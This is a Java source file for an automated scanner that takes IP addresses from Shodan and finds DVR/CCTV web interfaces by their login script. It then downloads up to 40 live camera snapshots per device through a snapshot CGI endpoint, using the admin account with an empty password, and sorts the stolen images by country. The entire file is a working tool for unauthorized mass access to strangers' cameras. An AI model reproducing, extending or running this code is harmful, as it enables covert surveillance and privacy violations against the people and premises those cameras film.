package com.object0r.scanners.ccSnapTv;

import com.maxmind.geoip2.DatabaseReader;
import com.maxmind.geoip2.model.CountryResponse;
import com.maxmind.geoip2.record.Country;
import com.object0r.scanners.ShodanScanner.ShodanWorkerManager;
import com.object0r.toortools.Utilities;
import com.object0r.toortools.http.HTTP;
import com.object0r.toortools.http.HttpRequestInformation;
import com.object0r.toortools.http.HttpResult;
import org.apache.commons.io.FileUtils;
import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.net.InetAddress;
import java.util.Collections;
import java.util.Random;
import java.util.Vector;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class CcSnapTv
{
    ShodanWorkerManager shodanWorkerManager;
    static final String outputDir = "output";
    static int total;
    static int found;
    File ipDatabaseFile;
    DatabaseReader ipReader;
    public CcSnapTv(String iniFile)
    {
        shodanWorkerManager = new ShodanWorkerManager(iniFile);
        ipDatabaseFile = new File("resources/GeoLite2-Country.mmdb");
        try {
            ipReader = new DatabaseReader.Builder(ipDatabaseFile).build();
        } catch (IOException e) {
            e.printStackTrace();
        }
        while (true)
        {

            try
            {
                process();
                Thread.sleep(5000);
            }
            catch (InterruptedException e)
            {
                e.printStackTrace();
            }
        }
    }

    Vector<String> ips = new Vector<String>();
    private void process()
    {
        int threadCount = 25;
        try
        {
            try
            {
                new File(outputDir + "/").mkdirs();
            }
            catch (Exception e)
            {
                /* no-op */
            }
            readIps();
            Collections.shuffle(ips);
            ExecutorService executorService = Executors.newFixedThreadPool(15);

            for (final String ip : ips)
            {
                Thread t = new Thread()
                {
                    public void run()
                    {
                        scanIp(ip);
                    }
                };

                executorService.submit(t);

                if (threadCount-- > 0)
                {
                    Thread.sleep(200);
                }
            }
            executorService.shutdown();
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
    }

    public String getIpCountry(String ip)
    {
        String country = "unknown";
        try
        {
            InetAddress ipAddress = InetAddress.getByName(ip);
            CountryResponse response = ipReader.country(ipAddress);
            Country countryCountry = response.getCountry();
            country = countryCountry.getName();
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
        return country;
    }

    public void scanIp(String ip)
    {
        try
        {
            total++;
            ip = ip.replace("http://", "");

            String cleanIp = ip;
            if (cleanIp.contains(":"))
            {
                cleanIp = cleanIp.substring(0, cleanIp.indexOf(":"));
            }

            String country = getIpCountry(cleanIp);

            HttpRequestInformation httpRequestInfromation = new HttpRequestInformation();
            httpRequestInfromation.setUrl("http://" + ip);
            httpRequestInfromation.setMethodGet();
            httpRequestInfromation.setTimeoutSeconds(15);
            HttpResult httpResult = HTTP.request(httpRequestInfromation);
            String page = httpResult.getContentAsString();
            if (page.contains("login_chk_usr_pwd()"))
            {
                found++;
                //System.out.println(ip + " " + found + "/" + total);
                for (int i = 0; i < 40; i++)
                {   //Download at most 40 images - To prevent errors.
                    httpRequestInfromation = new HttpRequestInformation();
                    httpRequestInfromation.setMethodGet();
                    httpRequestInfromation.setTimeoutSeconds(20);
                    httpRequestInfromation.setUrl("http://" + ip + "/cgi-bin/snapshot.cgi?chn=" + i + "&u=admin&p=&q=0&d=1");
                    httpResult = HTTP.request(httpRequestInfromation);
                    String headerValue = httpResult.getHeader("Content-Disposition").getValue();
                    String cameraIndex = Utilities.cut("filename=\"camera_", "_", headerValue);
                    if (!cameraIndex.equals(i + ""))
                    {
                        //
                        break;
                    }
                    String thisOutputDir = outputDir+"/"+country;
                    if (!new File(thisOutputDir).exists())
                    {
                        new File(thisOutputDir).mkdirs();
                    }
                    //String filename = outputDir +"/" +(found)+"_"+(ip.replace(":","_"))+"_"+i+".jpg";
                    //String filename = outputDir + "/" + "_" + (ip.replace(":", "_")) + "_" + i + ".jpg";
                    String filename = thisOutputDir+ "/" + "_" + (ip.replace(":", "_")) + "_" + i + ".jpg";
                    FileUtils.writeByteArrayToFile(new File(filename), httpResult.getContent());
                    if (!validImage(filename))
                    {
                        //Move it into a different directory.
                        //new File(filename).renameTo(new File(filename.replace(outputDir +"/" , "output_bad/")));
                        //Or delete it.
                        new File(filename).delete();
                    }
                    thisOutputDir = outputDir+"/_everything";
                    filename = thisOutputDir+ "/" + "_" + (ip.replace(":", "_")) + "_" + i + ".jpg";

                    FileUtils.writeByteArrayToFile(new File(filename), httpResult.getContent());
                    if (!validImage(filename))
                    {
                        new File(filename).delete();
                    }
                }
            }
        }
        catch (Exception e)
        {
            /** We just ignore errors. */
        }
    }

    /**
     * If all pixels of an image are blue, then there is no camera attached to it.
     * Find 10 random pixels. If all of them are a certain blue, that means that the image is not valid.
     *
     * @param filename
     * @return
     */
    private boolean validImage(String filename)
    {
        try
        {
            BufferedImage img;

            img = ImageIO.read(new File(filename));
            boolean allPixelsAreBlue = true;
            for (int i = 0; i < 5; i++)
            {
                int width = new Random().nextInt(img.getWidth());
                int height = new Random().nextInt(img.getHeight());

                Color pixelColor = new Color(img.getRGB(width, height));
                if (isBad(pixelColor))
                {
                    allPixelsAreBlue = true;
                } else
                {
                    allPixelsAreBlue = false;
                    break;
                }
            }

            if (allPixelsAreBlue)
            {
                return false;
            } else
            {
                return true;
            }
        }
        catch (Exception e)
        {
            e.printStackTrace();
            return false;
        }
    }

    private boolean isBad(Color pixelColor)
    {
        if ((pixelColor.getGreen() > 10 && pixelColor.getGreen() < 40)
                && (pixelColor.getRed() > 10 && pixelColor.getRed() < 50)
                && (pixelColor.getBlue() > 180 && pixelColor.getRed() < 216))
        {
            return true;
        } else if ((pixelColor.getGreen() > 0 && pixelColor.getGreen() < 20)
                && (pixelColor.getRed() > 0 && pixelColor.getRed() < 20)
                && (pixelColor.getBlue() > 0 && pixelColor.getRed() < 20))
        {
            return true;
        } else
        {
            return false;
        }
    }

    private void readIps()
    {
        try
        {
            ips = shodanWorkerManager.getAndCleanFresh();
            System.out.println("Got "+ips.size() + " new ips");
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
    }
}
